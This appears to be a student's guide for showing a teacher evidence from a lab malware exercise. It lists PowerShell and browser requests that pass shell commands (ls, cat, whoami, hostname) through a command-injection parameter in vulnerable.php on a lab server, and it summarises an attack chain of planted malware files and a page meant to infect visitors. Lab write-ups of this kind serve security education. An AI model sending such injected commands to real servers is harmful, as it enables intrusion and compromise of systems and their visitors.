# MALWARE DEMONSTRATION GUIDE
## For showing your teacher the malware attack evidence

### **Background:**
You successfully ran a malware attack script from Kali Linux that:
1. **Planted malware** on the victim server (192.168.56.10)
2. **Created cross-system infection vectors** for site visitors

---

## **STEP-BY-STEP DEMONSTRATION COMMANDS**

### **Step 1: Show the malware directory was created**
```powershell
Invoke-WebRequest -Uri "http://192.168.56.10/vulnerable.php?cmd=ls+-la+/tmp/+|+grep+malware" -UseBasicParsing
```
**What this shows:** Proof that malware directory `malware_DEMO_1755119761` was created on victim server

---

### **Step 2: Show the infected web page was created** 
```powershell
Invoke-WebRequest -Uri "http://192.168.56.10/vulnerable.php?cmd=ls+-la+/tmp/+|+grep+infected" -UseBasicParsing
```
**What this shows:** Proof that infected web page `infected_page_DEMO_1755119761.html` was created for cross-system infection

---

### **Step 3: Show the attack timestamp (proves it's recent)**
```powershell
Invoke-WebRequest -Uri "http://192.168.56.10/vulnerable.php?cmd=ls+-la+/tmp/+|+grep+DEMO_1755119761" -UseBasicParsing
```
**What this shows:** Both files created at `Aug 13 21:16` (during your attack)

---

### **Step 4: Show what's inside the malware directory**
```powershell
Invoke-WebRequest -Uri "http://192.168.56.10/vulnerable.php?cmd=ls+-la+/tmp/malware_DEMO_1755119761/" -UseBasicParsing
```
**What this shows:** Contents of the malware installation directory

---

### **Step 5: Show the infected page content (cross-system infection)**
```powershell
Invoke-WebRequest -Uri "http://192.168.56.10/vulnerable.php?cmd=cat+/tmp/infected_page_DEMO_1755119761.html" -UseBasicParsing
```
**What this shows:** The malicious content that would infect any visitor to the site

---

### **Step 6: Show system information (proves compromise)**
```powershell
Invoke-WebRequest -Uri "http://192.168.56.10/vulnerable.php?cmd=whoami" -UseBasicParsing
Invoke-WebRequest -Uri "http://192.168.56.10/vulnerable.php?cmd=hostname" -UseBasicParsing
```
**What this shows:** Commands executing as `www-data` user on victim server

---

## **PYTHON SCRIPT OPTION**

**Instead of running individual commands, you can run the Python script:**
```bash
python check_malware_infection.py
```

**Requirements:**
- Python 3 installed
- `requests` library: `pip install requests`

---

## **WHAT TO EXPLAIN TO YOUR TEACHER**

### **Part 1: Malware planted on server ✅**
- **Evidence:** `/tmp/malware_DEMO_1755119761/` directory exists on victim server
- **Method:** Used command injection via `vulnerable.php` to deploy malware
- **Timestamp:** Shows recent attack (Aug 13 21:16)
- **User:** Running as `www-data` proves web-based attack succeeded

### **Part 2: Cross-system infection via site visit ✅**  
- **Evidence:** `infected_page_DEMO_1755119761.html` file created
- **Purpose:** Any visitor accessing this page would be infected
- **Method:** Web-based infection vector established
- **Simulation:** Shows how malware spreads to other systems

### **Attack Chain Demonstrated:**
1. **Initial compromise:** Exploited vulnerable.php on victim server
2. **Malware deployment:** Created persistent malware directory and files  
3. **Infection vectors:** Set up web pages that would infect visitors
4. **Cross-system spread:** Demonstrated how attack propagates to other systems

---

## **BROWSER DEMONSTRATION (Optional)**

You can also show in a web browser:
- Visit: `http://192.168.56.10/vulnerable.php?cmd=ls+-la+/tmp/malware_DEMO_1755119761/`
- This will show the malware directory in the browser

---

## **KEY POINTS FOR TEACHER**

✅ **Both lab requirements met:**
- Malware successfully planted on victim server
- Cross-system infection capability demonstrated

✅ **Real attack simulation:**
- Used actual exploitation techniques
- Created persistent malware artifacts  
- Established infection vectors for spread

✅ **Professional methodology:**
- Systematic attack progression
- Evidence collection and verification
- Clear demonstration of impact

## **IDS ALERTS**
Don't forget to show your teacher the **Snort IDS alerts** that were triggered during the malware attack - this proves the attack was detected by security systems!
